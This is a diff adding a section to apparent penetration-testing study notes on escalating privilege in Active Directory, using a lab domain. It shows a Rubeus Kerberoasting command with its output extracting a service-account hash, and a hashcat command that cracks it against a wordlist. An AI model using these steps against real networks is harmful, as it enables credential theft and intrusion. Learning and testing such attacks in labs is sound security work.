@@ -1,5 +1,62 @@
 # Escalating Privilege
 
+##
+
+## Abusing Active Directory Authentication
+
+Sometimes a way of escalating privileges is by moving laterally. We can take advantage of the same techniques and tools we would use for moving laterally to escalate our privileges.
+
+### Kerberoasting with Rubeus
+
+{% embed url="https://github.com/GhostPack/Rubeus" %}
+
+If Rubeus is not installed we'll have to switch to our Windows dev box and compile via VIsual Studio. We can transfer the binary back to our Kali host then to our victim.
+
+```powershell
+PS C:\Tools> .\Rubeus.exe kerberoast /outfile:hashes.kerberoast
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.1.2
+
+
+[*] Action: Kerberoasting
+
+[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
+[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.
+
+[*] Target Domain          : corp.com
+[*] Searching path 'LDAP://DC1.corp.com/DC=corp,DC=com' for '(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'
+
+[*] Total kerberoastable users : 1
+
+
+[*] SamAccountName         : iis_service
+[*] DistinguishedName      : CN=iis_service,CN=Users,DC=corp,DC=com
+[*] ServicePrincipalName   : HTTP/web04.corp.com:80
+[*] PwdLastSet             : 9/7/2022 5:38:43 AM
+[*] Supported ETypes       : RC4_HMAC_DEFAULT
+[*] Hash written to C:\Tools\hashes.kerberoast
+```
+
+### Cracking with Hashcat
+
+```shell-session
+kali@kali:~$ sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+...
+```
+
+
+
+### AS-REP Roasting with Rubeus
+
+
+
 ## Checking Groups - net user&#x20;
 
 Another way we can check groups a user belongs to is using `net user`
